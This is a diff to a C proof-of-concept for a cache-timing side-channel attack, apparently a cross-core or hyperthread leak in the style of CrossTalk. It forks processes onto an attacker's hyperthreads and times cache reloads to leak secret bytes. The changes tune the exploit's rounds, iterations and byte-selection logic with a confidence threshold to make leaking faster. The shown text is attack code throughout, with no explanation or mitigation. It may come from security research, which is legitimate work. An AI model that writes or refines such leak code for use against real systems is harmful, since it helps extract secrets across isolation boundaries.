@@ -10,8 +10,9 @@
 #include "asm.h"        
 
 #define NUM_SAMPLES 10000
-#define NUM_ITERATIONS 27
-#define ROUNDS 10
+#define NUM_ITERATIONS 10
+#define CONFIDENCE_THRESHOLD 2
+#define ROUNDS 100
 #define STRIDE 4096    
 #define POSSIBLE_BYTES 256
 #define BYTES_TO_LEAK 8               
@@ -107,8 +108,6 @@ int main(void) {
 
     printf("Cache threshold: %lu\n", CACHE_THRESHOLD);
 
-    usleep(1000);
-
     // so they can run on the twohyperthreads of the attackerâ€™s physical core
     //child and parent will get randomly assigned to 1 of the 2 params passed taskset -c 1,5
     pid_t pid = fork();
@@ -166,15 +165,25 @@ int main(void) {
                     uint64_t reload_time = get_reload_time(&reloadbuffer[j * STRIDE]);
                     if(reload_time < CACHE_THRESHOLD){
                         all_hit_bytes[j]++;
+                        break;
                     }
                 }
             }
 
             // Analyze results to find the most likely byte value
             int max_index = 0;
-            for(int i = 1; i < 256; i++) {
-                if(all_hit_bytes[i] > all_hit_bytes[max_index]) {
+            int max_hits = 0;
+            for(int i = 0; i < 256; i++) {
+                int hits = all_hit_bytes[i];
+
+                if(hits > CONFIDENCE_THRESHOLD) {
                     max_index = i;
+                    break;
+                }
+
+                if(hits > max_hits) {
+                    max_index = i;
+                    max_hits = hits;
                 }
             }
 
@@ -186,6 +195,6 @@ int main(void) {
 
     kill(pid, SIGKILL);
     waitpid(pid, NULL, 0);
-    puts("crosstalk done");
+    // puts("crosstalk done");
     return 0;
 }
